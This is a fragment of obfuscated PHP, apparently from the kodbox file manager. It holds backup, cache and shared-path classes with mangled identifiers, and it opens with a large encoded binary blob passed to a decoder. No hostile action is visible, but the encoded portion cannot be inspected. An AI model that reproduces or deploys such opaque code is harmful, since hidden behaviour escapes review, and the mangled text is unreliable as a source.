x44\x54\xf5\xe6\x94\xe9\x0\xca\x56\x84\xc\x89\x17\x50"."\xea\x95\x69\xf4\x81\x34\xfe\x9c\x85\x32\x9f\x59\x59\x8b\xf\x10\x4f\x5e\xe1\x5c\xc1\x71\xb1\xce\xad\xb2\x6\xbd\xb4\x36\x34\x81\x50\x3a\x82\x35\xc2\xba\x45\x66\x6e\xac\x24\xc1\x25\x38\x8a\xb2"."\176\161\145\104\374\230\107\276\327\224\347\217\40\144\154\16\101\237\71\244\74\272\17\361\66\272\123\372\46\22\255\376\377\245\42\315\114\110\52\232\356\106\112\73\144\173\217\72"."\101\166\341\347\236\372\315\21\367\133\207\70\305\373\300\223\353\151\47\151\323\20\143\140\371\61\52\167\45\137\311\243\52\12\171\304\126\101\240\16\253\210\75\110\61\36\220\24"."\226\76\75\211\376\164\303\57\73\316\274\235\240\210\12\76\131\315\201\252\261\337\310\146\54\256\54\43\22\332\164\301\230\223\132\130\137\104\143\217\365\222\227\337\232\30\116\206"._kodDe('LE5pr7x37OSvkasDle6hpXrvxfvc5LG3p6JYyQ8tLSU755sa63g3jKMnert+S1OIMw==')."\x8c\x2\x65\x32\xe1\x59\x86\xaf\xf7\x2\xa9\x0\x7b\x3a\x2f\xe3\x23\x8f\xbc\x51\x54\xe7\x7d\x28\x46\xda\x69\x1c\x7f\xca\xb5\xfb\xb2\x66\x4a\xcb\xc6\xa9\x8e\x99\xcb\x78\xc6\x42\xdc\x14\xd7\x1b"."\165\25\243\111\101\255\120\20\227\123\362\221\211\376\272\214\26\41\257\63\331\252\22\323\173\225\336\141\47\4\314\111\127\127\64\21\256\261\212\371\10\225\372\273\122\55\211\317".base64_decode('k5Wb6WWeMJOD4qifHfT2DiZMbpLdqHIRdLP0qHuw9AYWa88BRpGVS+EKPCAzYlBA')."\x99\xaf\x8\xd0\x70\x6d\x64\xc\x4a\x88\x1a\xa6\xcf\xe8\x11\x4c\x21\x13\xee\x5f\x93\x2a\x3d\x62\x4\xcf\xf5\x95\x7b\x93\x88\x42\x3e\xf9\x69\xd2\x7b\x39\x53\x83\xe3\xe2\x70\x97\xdd\x87\x8\xf5".base64_decode('C+9LeqWvArIXANnWgef/yrzpN+GTgD5hEfl1Tx0Juz33G9B4HJw04HxDCevh5Tr4')."\xb4\x7a\x2a\xc4\xbd\x93\x9c\x34\x4b\xe5\xb1\xe2\x8e\xda\xf5\x60\xa1\x34\x6a\x40\x6d\xa5\x8f\x1e\x4a\xd3\x20\x8d\xbb\x68\x65\x7d\xe4\xba\xde\xc7\xdc\xef\x95\x7d\x37\xd1\xf5\xf0\x92\x77\x41\xcb"."\274\274\370\215\15\202\152\57\141\272\62\156\254\127\67\77\145\261\73\116\157\61\303\5\273\252\245\13\173\37\352\320\264\344\200\130\236\313\324\116\237\71\127\26\156\210\45\24".strrev('8Éq¾ú]¤¨´pFwş9éË¾—]ktÉ?w•Qy…Câ…'."\0".'Ejı?OÌ‚').base64_decode('lbSDpAPRowpiYl0NW+w6egSKpznd36LkQ5lxSOee2Cz0aUUzi3nsHJaVO5bmZijL')."\xf1\x4d\x64\x26\x18\x93\x66\x90\x37\xcb\x75\x6f\xdf\xc9\xc4\x80\x34\x45\x64\x4b\x8c\x95\xdc\xa2\x63\x7a\x45\x41\xb8\x3a\x3e\x17\x89\x24\x32\x96\xcf\xc2\xb1\x8d\x6d\xc0\xc5\x6e\x93\x30\xd1\xff"."\142\1\31\217\104\331\51\241\10\124\146\344\301\105\14\265\224\171\72\123\322\235\370\232\176\123\352\216\363\203\176\315\361\113\0\51\211\17\165\47\106\26\30\120\204\140\133\335".base64_decode('Y/U0j6qJNnp8ykSFSkk86YVN4SVMIu5wbWYYOgHXzzCV/Hao0y/YF7pDXbtV8k0s')."\133\313\221\206\344\155\120\332\264\364\200\242\20\4\21\311\21\14\2\366\60\161\176\112\54\46\103\55\334\212\122\223\224\267\334\322\51\74\273\322\343\270\246\34\26\263\216\61"."\175\214\171\174\105\137\167\161\227\50\336\344\171\53\231\140\45\357\3\312\154\212\10\52\20\130\116\62\306\165\261\62\374\111\71\27\153\143\173\337\221\104\4\236\354\265\31\105"."\275\357\360\2\72\44\132\362\364\153\322\201\52\316\116\21\152\57\346\104\104\22\351\22\56\212\147\272\154\226\261\267\53\317\316\147\226\320\266\347\175\131\352\117\227\206\31\261".base64_decode('///7CcX/Wy8nzpzGhO+u55dbgORmVN645LObCn4943AfmvsCFPHHxaU4VwVmHs+Y').base64_decode('IzSNXThp2ax0tJZnUkoetkXAN8jfQi0X8ZrceR+57WIPwJP3a3vKFRSYh+w3DoKM')."\x31\x2a\x3\xd4\x34\x89\xd1\xc3\xf9\xd2\xcb\x62\xbc\x78\x51\xb7\xfb\x6b\x89\xe2\x28\x29\x26\xba\x80\x8\x13\xe6\x49\x2e\xc8\x42\x69\xcc\x3\x12\xf7\xe\x30\x79\xb2\xa1\x6e\xac\xc0\xb8\xc5\x6a"."\100\363\75\213\30\156\42\146\377\200\242\144\264\344\112\52\101\146\111\327\222\270\22\345\331\206\45\304\166\316\154\65\135\65\332\74\57\166\322\102\266\74\233\56\171\175\251\356"."\x40\x69\x6d\x8e\x6\xe4\x2a\x58\x1\xdb\x2d\xc2\xe2\xef\xae\x4f\xf3\x3e\xc4\x5e\xe3\x2f\xfd\x18\xb5\x7f\xc0\x52\x94\x38\x96\x5b\x30\x49\x14\xb9\xd2\x21\x77\xa9\x65\xea\x50\xb0\x4d\x88\x32\x13"."\x6c\x9c\xf2\xdb\x97\xbf\x94\x2a\xc4\x72\x38\x24\x8f\x97\xa1\x81\xe\xcb\x24\xd4\x9d\x3b\x95\xcb\x72\x24\x2d\x58\xe9\xe9\xf0\x49\x81\x92\xc3\x86\xa1\x3e\xd7\x94\x23\xc6\x4d\xdc\x19\x1a\x26\xf1"."\201\317\252\166\266\125\21\123\36\200\130\304\113\64\233\142\355\245\107\272\361\6\23\136\53\261\217\61\42\76\224\217\160\146\135\47\51\247\103\222\113\310\147\313\317\215\270\153"."\142\163\3\367\136\132\120\256\130\332\264\154\251\30\117\57\127\26\103\230\54\304\220\363\360\63\312\216\153\55\304\163\6\336\147\14\10\153\117\271\165\27\323\16\327\272\162\222"."\x74\xeb\x89\x28\xef\x8c\xfb\x5d\x14\x92\x49\x92\x99\x83\x53\x68\x41\xba\xb7\x73\x5f\x9b\x72\xe7\xed\x25\x68\xb3\x68\x44\xa5\x6c\x52\x8b\xf9\xcd\x43\xbf\xd8\x2\x31\x22\xdc\x62\x90\x6c\x7a\x23"."\21\222\336\352\366\326\162\77\353\56\135\262\246\11\344\205\113\357\321\304\365\236\104\164\260\152\230\55\22\347\201\47\275\334\53\345\275\332\260\240\230\4\141\236\311\64\153\303"."\145\212\146\30\153\302\123\121\12\57\112\50\56\311\250\131\350\312\353\43\336\307\232\3\262\41\264\253\140\151\252\60\172\226\352\213\33\25\61\114\234\126\156\370\144\243\271\253"."\xcb\x46\xd5\x1c\xa8\x44\x12\x7d\xd9\x82\xab\x60\x49\x4c\x10\xb6\xf9\x10\xba\x59\x74\x28\x9c\xd7\x17\x9f\x74\x9b\x70\xf3\x62\x7c\xcd\x50\x19\x62\x61\xe3\x77\xa5\x7a\xd8\x3a\x2c\x56\x61\xe4\x83"."\47\313\226\37\132\166\337\235\312\302\7\11\4\364\154\124\152\116\276\127\235\260\102\242\374\107\4\124\272\247\130\262\175\27\31\354\250\63\135\223\57\241\110\76\60\50\31\227".strrev('åCáRd«tÒÌÒ¤Ø—î“†#ØkFGx+—½=×–‹;¼Òé‘ÄÒøHá-.ñİ]3')."\xfb\xeb\xed\x15\x9b\x53\x2f\xf3\x28\x1a\x29\xe9\x8f\xa4\x9c\x91\x34\xcb\xd4\xa1\x3d\x2a\x5b\x8d\x66\xe1\x9a\x82\x76\x75\xd5\x9d\x60\xa\x70\x5d\x9a\x85\xeb\x96\x64\xb3\xca\x92\xac\x45\xaa\xe7"."\x68\x45\x7b\x82\xe1\x95\x4e\x1e\x8\x20\x32\x65\x6\xec\x61\xd3\x69\xd1\x89\xe6\xb3\x6c\xe1\xd2\xcf\x1\xc4\x79\x4b\x13\x89\x45\xf9\x5e\x8\x41\x83\xe7\x92\xbc\x5c\x2f\xca\x16\x9e\xb0\x17\xa2".strrev('à1<ºOnÛëv^$U^R¬¶L«7ì´gÄÛA»£+È¸ñJ%´*ìNYk‡(ç´')."\166\25\250\53\200\66\304\66\146\215\101\241\326\306\124\322\47\271\360\173\61\77\230\67\371\231\221\21\52\207\130\135\72\144\171\47\262\244\65\67\234\346\213\222\47\333\262\32"._kodDe('KjLm2MCmi03HFupgljROEk0lx67GUc/gon8yp9pYgzUZO5UbOgI4ESImdyBG+IaRaA==')."\20\227\323\366\44\212\105\300\204\313\244\203\322\11\160\313\100\57\50\33\361\105\70\277\232\42\256\136\351\271\112\263\23\246\345\370\160\136\322\54\220\337\6\323\161\304\205\75"."\345\361\11\61\210\17\107\237\244\217\202\102\342\36\12\167\212\134\160\20\260\45\350\205\4\341\252\24\63\317\11\235\346\22\244\344\212\340\213\23\36\221\317\76\270\62\155\56"."\172\56\165\105\2\142\116\123\346\50\163\244\211\255\306\105\177\304\325\12\231\62\101\237\0\370\311\32\65\304\36\337\16\322\234\40\74\300\340\327\60\241\10\257\255\5\6\12"."\175\256\352\364\315\52\256\151\372\165\55\200\110\125\64\101\275\257\23\106\34\154\157\22\311\104\111\126\107\50\221\130\32\213\67\121\147\355\45\331\244\226\244\241\124\222\325\321"."\x1a\x6b\x9f\x28\x2f\xdc\x16\x8a\x44\x4b\xf2\xb0\x32\x53\xbb\x2a\x3c\x9e\xd1\xac\x48\x7\xe9\x25\xb9\x11\x9c\xa8\x17\x91\xc6\xc5\xa2\x27\xe4\xee\x59\x48\xea\xb\xfd\x26\x13\xc0\xb3\x9b\x8c\x84"."\226\145\134\272\144\144\252\347\204\253\73\121\47\157\244\7\205\244\117\223\210\167\233\371\244\344\1\367\313\107\36\235\101\6\244\320\20\126\104\152\207\266\343\5\110\305\316\353"."\xf9\x5e\xe7\x84\xb4\xb8\x4c\xf\xb8\x2e\xdd\xa5\x74\xb2\x1f\x8\x82\x91\x60\x4e\x3e\x68\x49\xc2\x94\xb2\x13\x24\x4b\x79\x4b\x6f\x1d\x48\xae\x98\x0\xdc\xb1\x63\x4c\xd0\x62\x1b\x30\x53\xd2\xad"."\2\145\143\300\344\23\246\124\122\66\243\141\127\266\243\365\225\275\173\246\242\75\274\343\205\320\355\377\0\312\16\161\154\316\253\0\0"."", 10, -8))); goto BçîÅß¿ù›; d„ˆ ™ãŞƒ: class BackupFile { public function __construct() { } public function index() { $Ç½‚– = Backup::get(); $ö£¹ó¬ç = $Ç½‚–[$_SERVER[­á Ş³Ö][293]][$_SERVER[­á Ş³Ö][200]][$_SERVER[­á Ş³Ö][468]]; $ôå¡ıÌ— = array($_SERVER[­á Ş³Ö][469] => array($_SERVER[­á Ş³Ö][804], $ö£¹ó¬ç), $_SERVER[­á Ş³Ö][805] => array($_SERVER[­á Ş³Ö][331], $Ç½‚–[$_SERVER[­á Ş³Ö][748]])); $‹Øä‹Ø¡ = (int) Model($_SERVER[­á Ş³Ö][786])->where($ôå¡ıÌ—)->count($_SERVER[­á Ş³Ö][468]); $‘×´ä†ˆ = (int) Model($_SERVER[­á Ş³Ö][786])->where($ôå¡ıÌ—)->sum($_SERVER[­á Ş³Ö][76]); $šëŸÄ° = new TaskFileTransfer($_SERVER[­á Ş³Ö][806], $_SERVER[­á Ş³Ö][777], $‹Øä‹Ø¡, LNG($_SERVER[­á Ş³Ö][778]) . $_SERVER[­á Ş³Ö][779] . LNG($_SERVER[­á Ş³Ö][807])); $šëŸÄ°->task[$_SERVER[­á Ş³Ö][760]] = $‘×´ä†ˆ; $ÂúÖß°› = array($_SERVER[­á Ş³Ö][808] => $‹Øä‹Ø¡, $_SERVER[­á Ş³Ö][809] => $‘×´ä†ˆ, $_SERVER[­á Ş³Ö][810] => time()); Backup::set($ÂúÖß°›); $ôßûÔüÒ = !0; $ŸÃáô¹ñ = $this->storeIds(); $¤­º¿ÄÇ = 1; $Ë¸ÑÈ»® = 1000; $°«€‹ª¥ = $”ß„²½œ = 0; $µè¥‚Óâ = array(); $üà ÅÑó = $èªÊó´õ = 0; do { $óÓúù = $_SERVER[­á Ş³Ö][811]; $ÙÏò–› = Model($_SERVER[­á Ş³Ö][786])->where($ôå¡ıÌ—)->field($óÓúù)->order($_SERVER[­á Ş³Ö][812])->selectPage($Ë¸ÑÈ»®, $¤­º¿ÄÇ); $±êù±¤° = !empty($ÙÏò–›[$_SERVER[­á Ş³Ö][369]]) ? $ÙÏò–›[$_SERVER[­á Ş³Ö][369]] : array(); foreach ($±êù±¤° as $æÏˆ†Ö) { if (!$this->_fileExist($æÏˆ†Ö, $µè¥‚Óâ, $ŸÃáô¹ñ)) { $‹Øä‹Ø¡ -= 1; $‘×´ä†ˆ -= (int) $æÏˆ†Ö[$_SERVER[­á Ş³Ö][76]]; write_log("\146\x69\x6c\x65\x20\x6e\x6f\x74\x20\x65\170\x69\163\164\x2e\x66\151\x6c\x65\111\x44\x3a{$æÏˆ†Ö[$_SERVER[­á Ş³Ö][468]]}\x2c\x20\160\141\x74\x68\72{$æÏˆ†Ö[$_SERVER[­á Ş³Ö][84]]}", $_SERVER[­á Ş³Ö][813]); continue; } $ÏÆ¸•§ú = $æÏˆ†Ö[$_SERVER[­á Ş³Ö][84]]; $ØÔ–Öğš = "\173\151\157\72{$Ç½‚–[$_SERVER[­á Ş³Ö][748]]}\175" . substr($ÏÆ¸•§ú, strlen("\x7b\151\157\72{$æÏˆ†Ö[$_SERVER[­á Ş³Ö][814]]}\175")); if (IO::exist($ØÔ–Öğš)) { $šëŸÄ°->updateFileEnd($æÏˆ†Ö[$_SERVER[­á Ş³Ö][32]], $æÏˆ†Ö[$_SERVER[­á Ş³Ö][76]]); } else { $ØÔ–Öğš = get_path_father($ØÔ–Öğš); IO::mkdir($ØÔ–Öğš); if (!IO::copy($ÏÆ¸•§ú, $ØÔ–Öğš, $_SERVER[­á Ş³Ö][815])) { write_log($_SERVER[­á Ş³Ö][816] . $ÏÆ¸•§ú . $_SERVER[­á Ş³Ö][800] . $ØÔ–Öğš . $_SERVER[­á Ş³Ö][164], $_SERVER[­á Ş³Ö][777]); $ôßûÔüÒ = !1; break; } } $ö£¹ó¬ç = $æÏˆ†Ö[$_SERVER[­á Ş³Ö][468]]; $”ß„²½œ += 1; $°«€‹ª¥ += $æÏˆ†Ö[$_SERVER[­á Ş³Ö][76]]; $èªÊó´õ += 1; $üà ÅÑó += $æÏˆ†Ö[$_SERVER[­á Ş³Ö][76]]; if ($°«€‹ª¥ >= 1024 * 1024 * 100) { $ÂúÖß°› = array($_SERVER[­á Ş³Ö][817] => $ö£¹ó¬ç, $_SERVER[­á Ş³Ö][818] => $èªÊó´õ, $_SERVER[­á Ş³Ö][819] => $üà ÅÑó); Backup::set($ÂúÖß°›); $°«€‹ª¥ = $”ß„²½œ = 0; } } $—ş§ÚĞ = count($±êù±¤°); $¤­º¿ÄÇ++; } while ($—ş§ÚĞ == $Ë¸ÑÈ»®); $šëŸÄ°->end(); $ÂúÖß°› = array($_SERVER[­á Ş³Ö][820] => 1, $_SERVER[­á Ş³Ö][758] => time(), $_SERVER[­á Ş³Ö][772] => 1, $_SERVER[­á Ş³Ö][817] => $ö£¹ó¬ç, $_SERVER[­á Ş³Ö][809] => $‘×´ä†ˆ, $_SERVER[­á Ş³Ö][808] => $‹Øä‹Ø¡, $_SERVER[­á Ş³Ö][821] => time()); if ($”ß„²½œ) { $ÂúÖß°›[$_SERVER[­á Ş³Ö][818]] = $èªÊó´õ; $ÂúÖß°›[$_SERVER[­á Ş³Ö][819]] = $üà ÅÑó; } Backup::set($ÂúÖß°›); $this->_fileFilter($µè¥‚Óâ); return !0; } private function _fileExist($ï©µçù, &$óŒ„÷†Æ, $ÃÊãÚÆÔ) { $¡Ÿ«ìÇÅ =& $_SERVER[­á Ş³Ö]; $ç«­‘œ = $ï©µçù[$¡Ÿ«ìÇÅ[84]]; if (in_array($ï©µçù[$¡Ÿ«ìÇÅ[468]], $óŒ„÷†Æ)) { return !1; } if (!in_array($ï©µçù[$¡Ÿ«ìÇÅ[814]], $ÃÊãÚÆÔ)) { return !1; } if (IO::exist($ç«­‘œ)) { return !0; } $û…¹éœê = get_path_father($ç«­‘œ); if (IO::exist($û…¹éœê)) { $óŒ„÷†Æ[] = $ï©µçù[$¡Ÿ«ìÇÅ[468]]; return !1; } $‡€ôÃ = array($¡Ÿ«ìÇÅ[814] => $ï©µçù[$¡Ÿ«ìÇÅ[814]], $¡Ÿ«ìÇÅ[84] => array($¡Ÿ«ìÇÅ[383], "{$û…¹éœê}\45")); $Ê™Ø İÎ = Model($¡Ÿ«ìÇÅ[786])->where($‡€ôÃ)->field($¡Ÿ«ìÇÅ[469])->select(); $óŒ„÷†Æ = array_merge($óŒ„÷†Æ, array_to_keyvalue($Ê™Ø İÎ, $¡Ÿ«ìÇÅ[12], $¡Ÿ«ìÇÅ[468])); return !1; } private function _fileFilter($Ô„Õ–í) { $ÑÊª°Á =& $_SERVER[­á Ş³Ö]; if (empty($Ô„Õ–í)) { return; } $¨ÈÔ‘ß = array($ÑÊª°Á[468] => array($ÑÊª°Á[7], array_unique($Ô„Õ–í))); $è¾“·ºº = Model($ÑÊª°Á[822])->where($¨ÈÔ‘ß)->field($ÑÊª°Á[402])->select(); foreach ($è¾“·ºº as $åÖ×ë£) { Model($ÑÊª°Á[822])->remove($åÖ×ë£[$ÑÊª°Á[402]], !1); } } private function storeIds() { $‚¶Ÿ´’× =& $_SERVER[­á Ş³Ö]; $ùúåİ…ô = Model($‚¶Ÿ´’×[764])->listData(); $‰ğú›Ìá = array(); $€‹æúÈŒ = $GLOBALS[$‚¶Ÿ´’×[6]][$‚¶Ÿ´’×[89]][$‚¶Ÿ´’×[823]]; foreach ($ùúåİ…ô as $à½˜ûÕˆ) { $æŸü±±ƒ = strtolower($à½˜ûÕˆ[$‚¶Ÿ´’×[95]]); if (!isset($€‹æúÈŒ[$æŸü±±ƒ])) { continue; } $Ÿ®„äª· = $‚¶Ÿ´’×[74] . (isset($€‹æúÈŒ[$æŸü±±ƒ]) ? $€‹æúÈŒ[$æŸü±±ƒ] : ucfirst($æŸü±±ƒ)); if (!class_exists($Ÿ®„äª·)) { continue; } $‰ğú›Ìá[] = $à½˜ûÕˆ[$‚¶Ÿ´’×[399]]; } return $‰ğú›Ìá; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $£¶ƒÇ¾ =& $_SERVER[­á Ş³Ö]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¢‡ÔÂŒâ = $GLOBALS[$£¶ƒÇ¾[6]][$£¶ƒÇ¾[349]]; $ª÷¿Ôı¤ = $¢‡ÔÂŒâ[$¢‡ÔÂŒâ[$£¶ƒÇ¾[824]]]; $¹ä‚öØ = $¢‡ÔÂŒâ[$£¶ƒÇ¾[825]]; switch ($¢‡ÔÂŒâ[$£¶ƒÇ¾[824]]) { case $£¶ƒÇ¾[21]: self::$handle = Model($£¶ƒÇ¾[826]); break; case $£¶ƒÇ¾[827]: self::$handle = new CacheRedis($ª÷¿Ôı¤, $¹ä‚öØ); break; case $£¶ƒÇ¾[828]: self::$handle = new CacheMemcached($ª÷¿Ôı¤, $¹ä‚öØ); break; case $£¶ƒÇ¾[200]: self::$handle = new CacheFile($ª÷¿Ôı¤, $¹ä‚öØ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ˆ³Ê©ƒº) { if (is_array($ˆ³Ê©ƒº) || is_object($ˆ³Ê©ƒº)) { $ˆ³Ê©ƒº = json_encode($ˆ³Ê©ƒº); } $ˆ³Ê©ƒº = rawurlencode($ˆ³Ê©ƒº); return md5(KOD_SITE_ID . $_SERVER[­á Ş³Ö][11] . $ˆ³Ê©ƒº); } public static function get($ã•Âßø, $œæ®Òğê = false) { $æé’‚Ğ = self::key($ã•Âßø); if ($œæ®Òğê) { return unserialize(self::init()->get($æé’‚Ğ)); } if (!isset(self::$memoryCache[$æé’‚Ğ])) { $·æĞö„ö = self::init()->get($æé’‚Ğ); self::$memoryCache[$æé’‚Ğ] = unserialize($·æĞö„ö); } return self::$memoryCache[$æé’‚Ğ]; } public static function set($ç¥Äı¦É, $™ˆŞõâŸ, $à€œ•‡ñ = false) { $şçãå­ß = self::key($ç¥Äı¦É); if (isset(self::$memoryCache[$şçãå­ß]) && self::$memoryCache[$şçãå­ß] === $™ˆŞõâŸ) { return !0; } if ($à€œ•‡ñ === 0) { self::$memoryCache[$şçãå­ß] = $™ˆŞõâŸ; return !0; } CacheLock::lock($ç¥Äı¦É); $Â®¥Á™Å = self::init()->set($şçãå­ß, serialize($™ˆŞõâŸ), $à€œ•‡ñ); self::$memoryCache[$şçãå­ß] = $™ˆŞõâŸ; CacheLock::unlock($ç¥Äı¦É); return $Â®¥Á™Å; } public static function getCall($®‚ô¶ù¦, $ÃŒÍ¥ú, $Äàº¾©Ì, $ñäè¶ò = array()) { $³±ÛìÑ =& $_SERVER[­á Ş³Ö]; $å´«ŸíÆ = self::get($®‚ô¶ù¦); if ($å´«ŸíÆ || $å´«ŸíÆ === $³±ÛìÑ[12]) { return $å´«ŸíÆ; } $å´«ŸíÆ = call_user_func_array($Äàº¾©Ì, $ñäè¶ò); $å´«ŸíÆ = $å´«ŸíÆ ? $å´«ŸíÆ : $³±ÛìÑ[12]; self::set($®‚ô¶ù¦, $å´«ŸíÆ, $ÃŒÍ¥ú); return $å´«ŸíÆ; } public static function remove($†ÇÚ®Ï²) { $‚ÖÒÇŞ = self::key($†ÇÚ®Ï²); unset(self::$memoryCache[$‚ÖÒÇŞ]); self::clearTimeout(); CacheLock::lock($†ÇÚ®Ï²); $¨˜©Ûù» = self::init()->remove($‚ÖÒÇŞ); CacheLock::unlock($†ÇÚ®Ï²); return $¨˜©Ûù»; } public static function removeMemory($Ÿ®¾Ş—ã) { $¨Á±îó› = self::key($Ÿ®¾Ş—ã); unset(self::$memoryCache[$¨Á±îó›]); } public static function clearMemory($×·ÛÅÚ = false) { if ($×·ÛÅÚ) { $×·ÛÅÚ = self::key($×·ÛÅÚ); unset(self::$memoryCache[$×·ÛÅÚ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[­á Ş³Ö][829])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[­á Ş³Ö][830])) { self::init()->clearTimeout(); } } } $_file = $_SERVER[$_SERVER[­á Ş³Ö][736]]; goto e˜´Áæ×; b…¨–‹´İ‰: class PathDriverDriverShareItem { public function __construct($Š„„ã«ä) { $this->pathParse = $Š„„ã«ä; } public function __call($ä¡‹Ø, $şÓ™ªÊş) { $††Öå­Å =& $_SERVER[­á Ş³Ö]; if (method_exists($this, $ä¡‹Ø)) { return; } $õ‹¤Û™ = call_user_func_array(array($††Öå­Å[1345], $ä¡‹Ø), $şÓ™ªÊş); $çå°Â¹´ = array($††Öå­Å[1346], $††Öå­Å[1347], $††Öå­Å[1348], $††Öå­Å[1349], $††Öå­Å[546], $††Öå­Å[548], $††Öå­Å[1350], $††Öå­Å[107], $††Öå­Å[1351], $††Öå­Å[1352]); if (in_array($ä¡‹Ø, $çå°Â¹´)) { $õ‹¤Û™ = $this->getPathOuter($õ‹¤Û™); } return $õ‹¤Û™; } public function copy($‡ÖÍµ¬å, $øÌäş, $öØ÷İõ = false, $ĞïûÙ¡× = false) { return $this->copyMove($‡ÖÍµ¬å, $øÌäş, $öØ÷İõ, $_SERVER[­á Ş³Ö][546], $ĞïûÙ¡×); } public function move($˜üğŠ¾ş, $œÜõ§ì¿, $Ùõ°ÆÊ = false, $ì²Çøòï = false) { return $this->copyMove($˜üğŠ¾ş, $œÜõ§ì¿, $Ùõ°ÆÊ, $_SERVER[­á Ş³Ö][548], $ì²Çøòï); } private function copyMove($æé¥÷Áä, $†ßî¬€Ä, $¸šÉ¬¼¨, $Æ‹œ¦, $±‰†áŒĞ = false) { $¨ã—‰² =& $_SERVER[­á Ş³Ö]; $¸“Îå¾ = $†ßî¬€Ä; $à€ÔŒÇš = IO::driverMake($†ßî¬€Ä); if ($à€ÔŒÇš->pathParse[$¨ã—‰²[1147]]) { $†ßî¬€Ä = $à€ÔŒÇš->pathParse[$¨ã—‰²[1147]]; } else { $†ßî¬€Ä = $¸“Îå¾; } $¬ÑŒ®¬¥ = IO::copyMove($æé¥÷Áä, $†ßî¬€Ä, $¸šÉ¬¼¨, $Æ‹œ¦, $±‰†áŒĞ); $¬ÑŒ®¬¥ = $this->getPathOuter($¬ÑŒ®¬¥); return $¬ÑŒ®¬¥; } public function pathThis($êÙìå©) { return get_path_this($this->pathParse[$_SERVER[­á Ş³Ö][84]]); } public function pathFather($©é†ÀÍ¾) { return get_path_father($this->pathParse[$_SERVER[­á Ş³Ö][84]]); } public function iconvSystem($‡ì¨­°‹) { return $‡ì¨­°‹; } protected function infoParse($É—Ú½×…, $²À“Ï† = false) { $ã¦ÎÔö =& $_SERVER[­á Ş³Ö]; $Éüê²Ğ = $this->pathParse[$ã¦ÎÔö[486]][$ã¦ÎÔö[1171]] . $this->pathParse[$ã¦ÎÔö[1164]]; if ($²À“Ï†) { $ÓŒÒıÜ‚ = IO::infoWithChildren($Éüê²Ğ); } else { $ÓŒÒıÜ‚ = IO::info($Éüê²Ğ); } $™ìß½ÔÇ = $this->pathParse[$ã¦ÎÔö[486]]; return Action($ã¦ÎÔö[1343])->_shareItemeParse($ÓŒÒıÜ‚, $™ìß½ÔÇ); } public function listAll($É™‰ìãÍ) { $¢¾ãÊÖ‚ =& $_SERVER[­á Ş³Ö]; $¦œ¦…´ = IO::listAll($É™‰ìãÍ); $ê¶™‘ÈÅ = rtrim($this->pathParse[$¢¾ãÊÖ‚[486]][$¢¾ãÊÖ‚[1171]], $¢¾ãÊÖ‚[8]); foreach ($¦œ¦…´ as &$‡µ®Ê²) { $‡µ®Ê²[$¢¾ãÊÖ‚[84]] = $this->pathDriver . $¢¾ãÊÖ‚[8] . ltrim(substr($‡µ®Ê²[$¢¾ãÊÖ‚[84]], strlen($ê¶™‘ÈÅ)), $¢¾ãÊÖ‚[8]); } unset($‡µ®Ê²); return $¦œ¦…´; } public function listAllSimple($«Æ“à¥˜, $¯äŒ®Èœ = false) { $¿÷¾÷Ò¢ =& $_SERVER[­á Ş³Ö]; $àü›Ü§Ü = $this->listAll($«Æ“à¥˜); $ú—ı°Œ‘ = $this->pathParse[$¿÷¾÷Ò¢[421]]; if (trim($ú—ı°Œ‘, $¿÷¾÷Ò¢[8]) == trim(get_path_father($ú—ı°Œ‘), $¿÷¾÷Ò¢[8])) { $¯äŒ®Èœ = !0; } return IO::init($¿÷¾÷Ò¢[12])->listAllSimpleMake($àü›Ü§Ü, $ú—ı°Œ‘, $¯äŒ®Èœ); } public function getPathOuter($¤œ÷Ûáî) { $ç¼‰±Î =& $_SERVER[­á Ş³Ö]; $è­şÔù– = KodIO::parse($¤œ÷Ûáî); if ($è­şÔù–[$ç¼‰±Î[33]] == KodIO::KOD_SHARE_ITEM) { return $è­şÔù–[$ç¼‰±Î[84]]; } $ÖÛ¾Öù¯ = KodIO::clear($¤œ÷Ûáî); $´Î¶õƒà = KodIO::clear($this->pathParse[$ç¼‰±Î[486]][$ç¼‰±Î[1171]]); $óÕƒÔİÕ = substr($ÖÛ¾Öù¯, strlen($´Î¶õƒà)); if (substr($ÖÛ¾Öù¯, 0, strlen($´Î¶õƒà)) != $´Î¶õƒà) { return !1; } return $this->pathParse[$ç¼‰±Î[1165]] . $ç¼‰±Î[8] . ltrim($óÕƒÔİÕ, $ç¼‰±Î[8]); } public function getType() { $ò÷ÖùïÔ =& $_SERVER[­á Ş³Ö]; $¦³êéÁ = str_replace($ò÷ÖùïÔ[74], $ò÷ÖùïÔ[12], get_class($this)); return strtolower($¦³êéÁ); } public function isTypeObject($¡á½ÀŸì) { return IO::isTypeObject($¡á½ÀŸì); } public function info($ö±Û©õ£) { return $this->infoParse($ö±Û©õ£); } public function infoAuth($Ÿ°é¡¸Â) { return $this->infoParse($Ÿ°é¡¸Â); } public function infoWithChildren($àáŠ©×¿) { return $this->infoParse($àáŠ©×¿, !0); } public function infoFull($¤øÚÑ®¹) { return $this->infoParse($¤øÚÑ®¹); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($©³¸Ë®) { $this->pathParse = $©³¸Ë®; } protected function infoParse($ş×Äšûæ, $ğÅåôš÷ = false) { $ÔèÅ–ï =& $_SERVER[­á Ş³Ö]; return Action($ÔèÅ–ï[1170])->sharePathInfo($this->pathParse[$ÔèÅ–ï[84]], !0, $ğÅåôš÷); } public function listPath($´±ùÃ¹Ä, $Í÷½©¦ = false) { $á¾š¬à =& $_SERVER[­á Ş³Ö]; $¢óÎÊ‡ = IO::listPath($´±ùÃ¹Ä, $Í÷½©¦); if (!$¢óÎÊ‡) { return $¢óÎÊ‡; } if (is_array($¢óÎÊ‡[$á¾š¬à[1344]])) { $Ÿº¢ˆˆ¢ = Action($á¾š¬à[1353])->parsePathChildren($¢óÎÊ‡[$á¾š¬à[1344]], array($á¾š¬à[421] => $´±ùÃ¹Ä)); $¢óÎÊ‡[$á¾š¬à[1344]] = Action($á¾š¬à[1170])->shareItemInfo($Ÿº¢ˆˆ¢); } foreach ($¢óÎÊ‡ as $Õáµ¯¤æ => $½ºå¡»º) { if (!in_array($Õáµ¯¤æ, array($á¾š¬à[83], $á¾š¬à[82]))) { continue; } foreach 